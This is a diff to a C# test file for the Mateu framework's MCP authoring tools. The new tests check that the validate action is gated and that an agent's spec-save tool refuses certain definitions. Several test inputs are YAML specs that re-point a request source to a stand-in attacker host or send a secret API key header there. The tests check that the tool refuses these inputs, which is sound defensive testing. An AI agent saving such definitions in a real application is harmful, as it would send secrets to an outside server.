@@ -37,6 +37,7 @@ public class McpAuthoringTests
     }
 
     static readonly SyncHandler Handler = new(new MateuRegistry(typeof(AuthoringHome).Assembly));
+    static readonly SyncHandler AuthoringHandler = new(new MateuRegistry(typeof(AuthoringHome).Assembly)) { AuthoringOpen = true };
 
     static McpService Service() => new(Handler, Json);
 
@@ -227,10 +228,30 @@ public class McpAuthoringTests
 
     // ── validate / preview over the app ──────────────────────────────────────────────────────
 
+    // NM2: on the plain sync endpoint __validate__ answers only an app that exposes its authoring
+    // plane (the MCP endpoint on) or runs in dev mode; an MCP tool call is always served.
+    [Fact]
+    public void Validate_is_refused_on_the_plain_sync_endpoint_unless_the_authoring_plane_is_open()
+    {
+        var rq = new Mateu.Dtos.RunActionRqDto
+        {
+            Route = "", ActionId = "__validate__",
+            Parameters = new Dictionary<string, object?> { ["_yaml"] = JsonSerializer.SerializeToElement("foo: bar\n") },
+        };
+        var closed = new SyncHandler(new MateuRegistry(typeof(AuthoringHome).Assembly));
+        Assert.Throws<MateuForbiddenException>(() => closed.Handle(rq));
+        // an MCP tool call is served
+        var (isError, _) = Tool(new McpService(closed, Json), "mateu_validate_uidl", new JsonObject { ["yaml"] = "type: Routes\n" });
+        Assert.False(isError);
+        // ...and so is an app with its authoring plane open
+        var open = new SyncHandler(new MateuRegistry(typeof(AuthoringHome).Assembly)) { AuthoringOpen = true };
+        Assert.NotNull(open.Handle(rq).AppData);
+    }
+
     [Fact]
     public void Validate_goes_through_the_reserved_action_and_answers_the_report()
     {
-        var increment = Handler.Handle(new Mateu.Dtos.RunActionRqDto
+        var increment = AuthoringHandler.Handle(new Mateu.Dtos.RunActionRqDto
         {
             Route = "", ActionId = "__validate__",
             Parameters = new Dictionary<string, object?> { ["_yaml"] = JsonSerializer.SerializeToElement("foo: bar\n") },
@@ -364,6 +385,40 @@ public class McpAuthoringTests
         Assert.Equal("partials/greeting.yaml", (string?)result["path"]);
         Assert.Equal(System.Text.Encoding.UTF8.GetByteCount(Page), (int)result["bytes"]!);
         Assert.Equal(Page, File.ReadAllText(Path.Combine(dir, "partials", "greeting.yaml")));
+    }
+
+    // NM3: an agent saves what a screen is made of, never what decides a request — so in dev mode it
+    // cannot re-point a proxied source at its own server and have Mateu send it the secret.
+    [Theory]
+    [InlineData("pay.yaml", "type: Sources\nsources:\n  - name: pay\n    source:\n      url: https://x\n")]
+    [InlineData("prod.yaml", "type: Environment\nsources:\n  pay:\n    url: https://attacker.example\n")]
+    [InlineData("r.yaml", "type: Routes\nroutes:\n  - route: x\n    layout: x.yaml\n")]
+    [InlineData("p1.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    headers:\n      X-Api-Key: ${secret.API_KEY}\n")]
+    [InlineData("p2.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    url: https://attacker.example\n    proxy: true\n")]
+    [InlineData("p3.yaml", "type: Button\nlabel: Go\nactionId: go\nrestAction:\n  source:\n    ref: payments\n    url: https://attacker.example\n")]
+    public void Save_spec_refuses_what_could_repoint_a_request_or_leak_a_secret(string path, string yaml)
+    {
+        var dir = TempDir();
+        var (_, text) = Tool(Service(), "mateu_save_spec",
+            new JsonObject { ["path"] = path, ["yaml"] = yaml }, dev: true, specsDir: dir);
+        var result = JsonNode.Parse(text)!;
+        Assert.False(result["saved"]!.GetValue<bool>());
+        var reason = (string)result["reason"]!;
+        Assert.True(reason.StartsWith("Only a page, a partial or a business-component catalogue can be saved by an agent;")
+                    || reason.StartsWith("A definition saved by an agent may not reference a secret,"), reason);
+        Assert.False(File.Exists(Path.Combine(dir, path)));
+    }
+
+    [Theory]
+    [InlineData("sources.yaml")]
+    [InlineData("x/routes.yml")]
+    [InlineData("environments/prod.yaml")]
+    public void Save_spec_refuses_a_catalogue_file_whatever_it_holds(string path)
+    {
+        var dir = TempDir();
+        Assert.Equal((true, "Error: Refused path \"" + path + "\": catalogue files (sources, routes, actions, types, project, environments, translations) are written by hand."),
+            Tool(Service(), "mateu_save_spec", new JsonObject { ["path"] = path, ["yaml"] = Page }, dev: true, specsDir: dir));
+        Assert.False(File.Exists(Path.Combine(dir, path)));
     }
 
     [Fact]
